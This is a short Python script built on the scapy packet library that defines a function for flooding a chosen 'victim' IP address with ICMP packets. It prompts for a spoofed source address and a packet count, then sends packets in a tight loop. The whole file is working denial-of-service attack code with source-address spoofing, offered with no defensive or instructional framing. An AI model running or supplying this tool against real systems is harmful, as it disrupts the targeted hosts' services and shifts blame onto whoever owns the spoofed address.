#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
from time import sleep
from scapy.all import*

def ICMP_SINGLE_IP_RAND_PORT():
	i = 1

	srcip = raw_input("Please input the the source IP address for the attack:  ") #allows for the src ip to be set
	print("\n")

	vicip = raw_input("Please input the target IP Address:  ") #the victim which will be flooded
	print("\n")

	max_packets = int(input("Please input the maximum amount of packets to be sent to the server:   ")) #sets the max packets

	while i < max_packets+1:
	  IPLayer = IP(dst=vicip, src=srcip)
	  pkt = IPLayer/ICMP()/"Hello" #ensures the packets are sent via ICMP
	  send(pkt, inter=0.001)
	  i += 1
